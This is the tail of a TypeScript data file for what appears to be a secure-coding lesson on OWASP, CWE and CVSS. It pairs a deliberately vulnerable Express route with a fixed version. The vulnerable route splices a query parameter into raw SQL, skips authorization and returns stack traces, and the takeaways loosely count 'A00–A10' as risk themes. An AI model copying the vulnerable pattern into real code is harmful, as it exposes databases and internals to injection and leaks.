    vulnerableCode: `// ANTI-PATTERN: Hardcoding security classifications blindly or ignoring root CWE\n// Fixing 1 reported endpoint symptom without addressing systemic CWE across the codebase\napp.get('/api/users', (req, res) => {\n  // Wait: Verbose stack trace + missing role check + plain query all mixed together\n  try { return res.json(db.rawQuery(\`SELECT * FROM users WHERE org='\${req.query.org}'\`)); }\n  catch (err) { return res.status(500).send(err.stack); }\n});`,
    secureCode: `// SECURE PRACTICE: Address underlying CWEs systematically per OWASP ASVS + NIST SP 800-95\napp.get('/api/users', authenticate, requireRole('ADMIN'), async (req, res, next) => {\n  try {\n    // Addresses CWE-862 (A01 Authz), CWE-89 (A03 Parameterized ORM), and CWE-209 (A05 Stack Leak)\n    const orgId = String(req.query.org || req.user.orgId);\n    const users = await prisma.user.findMany({\n      where: { orgId },\n      select: { id: true, username: true, role: true }, // Never select passwordHash!\n    });\n    res.json({ items: users });\n  } catch (err) {\n    next(err); // Central error handler logs stack internally & returns safe generic 500 JSON\n  }\n});`,
    codeLanguage: 'typescript',
    realWorldExample:
      'PCI-DSS v4.0, ISO 27001 audits, and government FedRAMP/NIST assessments explicitly require organizations to map findings to OWASP Top 10 / ASVS / CWE / CVSS so engineers eliminate systemic root causes rather than patching isolated tickets.',
    references: [
      { title: 'OWASP Top 10:2021 A00 Introduction', url: 'https://owasp.org/Top10/A00_2021_Introduction/' },
      { title: 'OWASP Application Security Verification Standard (ASVS)', url: 'https://owasp.org/www-project-application-security-verification-standard/' },
      { title: 'NIST SP 800-95: Guide to Secure Web Services', url: 'https://csrc.nist.gov/pubs/sp/800/95/final' },
      { title: 'FIRST CVSS v3.1 Specification', url: 'https://www.first.org/cvss/v3.1/specification-document' },
    ],
    keyTakeaways:
      '• **OWASP Top 10 (A00–A10)** = Top 10 risk themes; **CWE** = Root coding bug class; **CVE** = Specific disclosed product flaw.\n• **CVSS v3.1** scores severity (`0.0`–`10.0`), **OWASP ASVS** guides developers, **OWASP WSTG** guides pentesters, and **RFCs / NIST SP 800-95** define the foundational web architecture.',
  },
];
